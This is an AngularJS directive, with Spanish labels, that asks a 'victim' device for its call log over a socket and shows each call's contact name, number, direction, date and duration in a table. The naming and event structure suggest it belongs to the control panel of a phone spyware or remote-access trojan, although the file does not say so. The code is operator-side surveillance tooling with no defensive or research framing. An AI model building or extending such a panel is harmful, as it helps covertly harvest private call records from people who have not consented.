// Directiva para mostrar registro de llamadas
angular.module('myappy').directive('labCalls', function($timeout) {
  return {
    restrict: 'E',
    scope: { victim: '=' },
    template: `
      <div>
        <h4>Registro de llamadas</h4>
        <table class="ui celled table" ng-if="calls.length">
          <thead>
            <tr>
              <th>Nombre</th>
              <th>Número</th>
              <th>Tipo</th>
              <th>Fecha</th>
              <th>Duración (seg)</th>
            </tr>
          </thead>
          <tbody>
            <tr ng-repeat="call in calls">
              <td>{{call.name || 'Desconocido'}}</td>
              <td>{{call.phoneNo || '-'}}</td>
              <td>
                <span ng-if="call.type==1">Entrante</span>
                <span ng-if="call.type==2">Saliente</span>
                <span ng-if="call.type!=1 && call.type!=2">Otro</span>
              </td>
              <td>{{call.date || '-'}}</td>
              <td>{{call.duration || '0'}}</td>
            </tr>
          </tbody>
        </table>
        <div ng-if="loading" class="ui active inline loader"></div>
        <div ng-if="!calls.length && !loading" class="ui message">No hay registros de llamadas disponibles.</div>
      </div>
    `,
    link: function(scope, element, attrs) {
      scope.calls = [];
      scope.loading = true;

      let callsListener;

      scope.$watch('victim', function(newVictim) {
        if (!newVictim) return;

        scope.loading = true;
        scope.calls = [];

        if (callsListener) socket.off('calls-data', callsListener);

        console.log("LOG FRONTEND: solicitando llamadas de victimId:", newVictim.id);

        callsListener = function(data) {
          console.log("LOG FRONTEND: recibido en callsListener:", data);
          $timeout(function() {
            let callsArr = [];
            if (data && data.callsList) {
              if (Array.isArray(data.callsList)) {
                callsArr = data.callsList;
              } else {
                callsArr = Object.values(data.callsList);
              }
            } else if (Array.isArray(data)) {
              callsArr = data;
            } else if (data) {
              callsArr = Object.values(data);
            }
            console.log("LOG FRONTEND: callsArr que se asigna:", callsArr);
            if (callsArr.length > 0) {
              console.log("LOG FRONTEND: ejemplo de llamada:", callsArr[0]);
            }
            scope.calls = callsArr;
            scope.loading = false;
          });
        };

        socket.on('calls-data', callsListener);

        socket.emit('get-calls', { victimId: newVictim.id });
      });

      scope.$on('$destroy', function() {
        if (callsListener) socket.off('calls-data', callsListener);
      });
    }
  };
});